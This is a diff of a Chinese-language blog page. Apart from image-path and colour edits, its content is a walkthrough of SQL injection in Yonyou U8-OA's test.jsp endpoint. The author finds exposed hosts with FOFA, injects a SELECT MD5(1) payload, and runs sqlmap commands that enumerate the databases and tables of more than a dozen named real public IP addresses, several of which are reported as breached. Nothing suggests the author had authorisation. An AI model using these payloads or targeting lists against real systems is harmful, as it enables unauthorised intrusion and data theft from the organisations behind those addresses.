@@ -174,7 +174,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="color: #00bcd4">漏洞</a>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="color: #00a596">漏洞</a>
             </span>
             
         </span>
@@ -193,132 +193,132 @@
 <p>–tables：查看所有的表</p>
 <h2 id="第一个样例">第一个样例</h2>
 <h3 id="一、使用FOFA搜索引擎查询使用用友U8-OA的IP地址与端口">一、使用FOFA搜索引擎查询使用用友U8-OA的IP地址与端口</h3>
-<p><img src="/.com//image-20230822164632171.png" alt="image-20230822164632171"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822164632171.png" alt="image-20230822164632171"></p>
 <p>用友OA办公界面如下：</p>
-<p><img src="/.com//image-20230822164648785.png" alt="image-20230822164648785"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822164648785.png" alt="image-20230822164648785"></p>
 <p>本例使用IP:端口为：218.202.98.188:9000</p>
 <h3 id="二、漏洞复现">二、漏洞复现</h3>
 <h4 id="1、对漏洞进行初步检测与查询">1、对漏洞进行初步检测与查询</h4>
 <p>使用如下payload：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">ip<span class="token punctuation">:</span>port<span class="token operator">/</span>yyoa<span class="token operator">/</span>common<span class="token operator">/</span>js<span class="token operator">/</span>menu<span class="token operator">/</span>test<span class="token operator">.</span>jsp<span class="token operator">?</span>doType<span class="token operator">=</span><span class="token number">101</span><span class="token operator">&amp;</span><span class="token constant">S1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token constant">SELECT</span><span class="token operator">%</span><span class="token number">20</span>MD5<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>在url地址后加入payload进行测试，发现回显成功，表明网站确实存在漏洞</p>
-<p><img src="/.com//image-20230822164716007.png" alt="image-20230822164716007"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822164716007.png" alt="image-20230822164716007"></p>
 <h4 id="2、使用sqlmap对漏洞进行进一步验证">2、使用sqlmap对漏洞进行进一步验证</h4>
 <p>使用语句：</p>
 <pre class="line-numbers language-none"><code class="language-none">c:\sqlmap&gt;python sqlmap.py -u &quot;http:&#x2F;&#x2F;ip:port&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20md5(1))&quot; -p &quot;S1&quot; --batch --dbs <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>对数据库进行探测</p>
-<p><img src="/.com//image-20230822164607612.png" alt="image-20230822164607612"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822164607612.png" alt="image-20230822164607612"></p>
 <p>之后再探测数据表：</p>
 <pre class="line-numbers language-none"><code class="language-none">c:\sqlmap&gt;python sqlmap.py -u &quot;http:&#x2F;&#x2F;ip:port&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20md5(1))&quot; -p &quot;S1&quot; --batch --D information_schema --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230822165415830.png" alt="image-20230822165415830"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822165415830.png" alt="image-20230822165415830"></p>
 <h2 id="其他例子">其他例子</h2>
 <h3 id="一、218-21-32-202-8060">一、218.21.32.202:8060</h3>
-<p><img src="/.com//image-20230822171323659.png" alt="image-20230822171323659"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822171323659.png" alt="image-20230822171323659"></p>
 <p>使用payload对漏洞进行初步检测和查询：</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;218.21.32.202:8060&#x2F;yyoa&#x2F;&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20MD5(1))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230822171535856.png" alt="image-20230822171535856"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822171535856.png" alt="image-20230822171535856"></p>
 <p>使用语句：</p>
 <pre class="line-numbers language-none"><code class="language-none">c:\sqlmap&gt;sqlmap.py -u &quot;[http:&#x2F;&#x2F;ip](https:&#x2F;&#x2F;link.zhihu.com&#x2F;?target&#x3D;http%3A&#x2F;&#x2F;ip):port&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20md5(1))&quot; -p &quot;S1&quot; --batch --dbs <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>对数据库进行探测，探测结果如下图所示：</p>
-<p><img src="/.com//image-20230822171716248.png" alt="image-20230822171716248"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822171716248.png" alt="image-20230822171716248"></p>
 <p>结果中显示all tested parameters do not appear to be injectable，意味着无法进行SQL注入利用漏洞。</p>
 <h3 id="二、116-113-99-158-8085">二、116.113.99.158:8085</h3>
-<p><img src="/.com//image-20230822173432590.png" alt="image-20230822173432590"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822173432590.png" alt="image-20230822173432590"></p>
 <p>使用payload对漏洞进行初步检测和查询：</p>
-<p><img src="/.com//image-20230822173419446.png" alt="image-20230822173419446"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822173419446.png" alt="image-20230822173419446"></p>
 <p>之后使用sqlmap对数据库进行探测：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;116.113.99.158:8085&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20md5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>探测结果如下所示：</p>
-<p><img src="/.com//image-20230822174613000.png" alt="image-20230822174613000"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822174613000.png" alt="image-20230822174613000"></p>
 <p>探测出数据库，因此存在漏洞。</p>
 <p>此外可以对数据表进行探测：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;116.113.99.158:8085&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20md5(1))&quot; -p &quot;S1&quot; --batch -D information_schema --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230822175547288.png" alt="image-20230822175547288"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822175547288.png" alt="image-20230822175547288"></p>
 <p>成功探测。</p>
 <h3 id="三、222-133-58-26-8888">三、222.133.58.26:8888</h3>
 <p>可以显示页面</p>
-<p><img src="/.com//image-20230822180652240.png" alt="image-20230822180652240"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822180652240.png" alt="image-20230822180652240"></p>
 <p>在地址后添加payload进行初步测试，测试结果如下：</p>
-<p><img src="/.com//image-20230822175828954.png" alt="image-20230822175828954"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822175828954.png" alt="image-20230822175828954"></p>
 <p>猜测该地址下无法进行SQL注入。使用sqlmap进行验证</p>
-<p><img src="/.com//image-20230822180604268.png" alt="image-20230822180604268"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822180604268.png" alt="image-20230822180604268"></p>
 <p>与预测结果相同，由于界面为404所以无法进行SQL注入，应该有对用友U8-OA的漏洞进行修复。</p>
 <h3 id="四、59-50-11-61-9090">四、59.50.11.61:9090</h3>
-<p><img src="/.com//image-20230822182348630.png" alt="image-20230822182348630"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822182348630.png" alt="image-20230822182348630"></p>
 <p>使用payload进行初步测试，页面为404</p>
-<p><img src="/.com//image-20230822182446197.png" alt="image-20230822182446197"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230822182446197.png" alt="image-20230822182446197"></p>
 <h3 id="五、115-236-80-21-9000">五、115.236.80.21:9000</h3>
-<p><img src="/.com//image-20230823094318173.png" alt="image-20230823094318173"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823094318173.png" alt="image-20230823094318173"></p>
 <p>使用payload进行页面初步测试，页面为404</p>
-<p><img src="/.com//image-20230823094707994.png" alt="image-20230823094707994"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823094707994.png" alt="image-20230823094707994"></p>
 <h3 id="六、61-138-14-58-8100">六、61.138.14.58:8100</h3>
-<p><img src="/.com//image-20230823105228173.png" alt="image-20230823105228173"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823105228173.png" alt="image-20230823105228173"></p>
 <p>使用payload对页面进行初步测试：</p>
 <pre class="line-numbers language-none"><code class="language-none">61.138.104.58:8100&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>注：在URL语句中，%20与+的作用相同，都用来表示空格</p>
-<p><img src="/.com//image-20230823095108737.png" alt="image-20230823095108737"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823095108737.png" alt="image-20230823095108737"></p>
 <p>使用sqlmap对数据库进行探测，实现SQL注入：检测结果注入成功</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;61.138.104.58:8100&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823100008261.png" alt="image-20230823100008261"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823100008261.png" alt="image-20230823100008261"></p>
 <p>查看数据表情况：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;61.138.104.58:8100&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch -D information_schema --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823100846215.png" alt="image-20230823100846215"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823100846215.png" alt="image-20230823100846215"></p>
 <p>SQL注入成功，存在漏洞</p>
 <h3 id="七、119-187-117-22-9090">七、119.187.117.22:9090</h3>
 <p>使用payload对网站进行初步检查，并未泄露md5值：</p>
-<p><img src="/.com//image-20230823104247284.png" alt="image-20230823104247284"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823104247284.png" alt="image-20230823104247284"></p>
 <p>使用sqlmap尝试进行SQL注入，注入失败：</p>
-<p><img src="/.com//image-20230823104555235.png" alt="image-20230823104555235"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823104555235.png" alt="image-20230823104555235"></p>
 <h3 id="八、58-247-11-78-9090">八、58.247.11.78:9090</h3>
 <p>使用payload添加在url语句后进行初步测试，测试结果为页面出现404</p>
-<p><img src="/.com//image-20230823104945816.png" alt="image-20230823104945816"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823104945816.png" alt="image-20230823104945816"></p>
 <h3 id="九、113-200-244-42-8888">九、113.200.244.42:8888</h3>
-<p><img src="/.com//image-20230823105254842.png" alt="image-20230823105254842"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823105254842.png" alt="image-20230823105254842"></p>
 <p>使用payload对页面进行初步测试：MD5值泄露，存在漏洞</p>
 <pre class="line-numbers language-none"><code class="language-none">113.200.244.42:8888&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823105143179.png" alt="image-20230823105143179"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823105143179.png" alt="image-20230823105143179"></p>
 <p>使用sqlmap进行进一步检查：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;113.200.244.42:8888&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823105558557.png" alt="image-20230823105558557"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823105558557.png" alt="image-20230823105558557"></p>
 <p>SQL注入成功，接下来可以查看数据库information_schema中的数据表</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;113.200.244.42:8888&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch -D information_schema --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823105719073.png" alt="image-20230823105719073"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823105719073.png" alt="image-20230823105719073"></p>
 <p>成功查看数据表！</p>
 <h3 id="十、110-0-67-157-38080">十、110.0.67.157:38080</h3>
-<p><img src="/.com//image-20230823141803107.png" alt="image-20230823141803107"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823141803107.png" alt="image-20230823141803107"></p>
 <p>使用payload进行初步测试，成功返回MD5值：</p>
-<p><img src="/.com//image-20230823141852166.png" alt="image-20230823141852166"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823141852166.png" alt="image-20230823141852166"></p>
 <p>使用sqlmap进行测试，返回数据库如下：</p>
-<p><img src="/.com//image-20230823144332677.png" alt="image-20230823144332677"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823144332677.png" alt="image-20230823144332677"></p>
 <p>查看information_schema数据库中表的内容，如下：</p>
-<p><img src="/.com//image-20230823144412649.png" alt="image-20230823144412649"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823144412649.png" alt="image-20230823144412649"></p>
 <h3 id="十一、122-228-136-174-8071">十一、122.228.136.174:8071</h3>
-<p><img src="/.com//image-20230823145545140.png" alt="image-20230823145545140"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823145545140.png" alt="image-20230823145545140"></p>
 <p>使用payload进行初步检测，检测结果如下图：返回MD5值，证明存在漏洞</p>
-<p><img src="/.com//image-20230823145625629.png" alt="image-20230823145625629"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823145625629.png" alt="image-20230823145625629"></p>
 <p>之后使用sqlmap进行测试：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;122.228.136.174:8071&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT%20MD5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230823154317266.png" alt="image-20230823154317266"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823154317266.png" alt="image-20230823154317266"></p>
 <p>返回数据库。再查看information_schema数据表：</p>
-<p><img src="/.com//image-20230823155138990.png" alt="image-20230823155138990"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230823155138990.png" alt="image-20230823155138990"></p>
 <p>查看成功 存在漏洞</p>
 <h3 id="十二、113-240-25-188-8088">十二、113.240.25.188:8088</h3>
-<p><img src="/.com//image-20230824111123148.png" alt="image-20230824111123148"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824111123148.png" alt="image-20230824111123148"></p>
 <p>使用payload进行初步检测，检测结果如下：返回MD5值，认为存在漏洞可进行SQL注入</p>
-<p><img src="/.com//image-20230824111205256.png" alt="image-20230824111205256"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824111205256.png" alt="image-20230824111205256"></p>
 <p>利用sqlmap进行sql注入：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;113.240.255.188:8088&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230824111521560.png" alt="image-20230824111521560"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824111521560.png" alt="image-20230824111521560"></p>
 <p>可以查看数据库表项：以information_schema为例：</p>
-<p><img src="/.com//image-20230824112101995.png" alt="image-20230824112101995"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824112101995.png" alt="image-20230824112101995"></p>
 <p>存在漏洞！</p>
 <h3 id="十三、218-76-139-134-8085">十三、218.76.139.134:8085</h3>
-<p><img src="/.com//image-20230824112241569.png" alt="image-20230824112241569"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824112241569.png" alt="image-20230824112241569"></p>
 <p>使用payload进行初步检测，结果如下：</p>
-<p><img src="/.com//image-20230824112334651.png" alt="image-20230824112334651"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824112334651.png" alt="image-20230824112334651"></p>
 <p>使用sqlmap进行进一步测试：</p>
 <pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;218.76.139.134:8085&#x2F;yyoa&#x2F;common&#x2F;js&#x2F;menu&#x2F;test.jsp?doType&#x3D;101&amp;S1&#x3D;(SELECT+MD5(1))&quot; -p &quot;S1&quot; --batch --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/.com//image-20230824114504475.png" alt="image-20230824114504475"></p>
+<p><img src="/2023/08/22/%E2%80%9CyongyouOA%E2%80%9D/image-20230824114504475.png" alt="image-20230824114504475"></p>
 <p>unable to connect to the target URL，无法成功泄露数据库</p>
 
     </div>
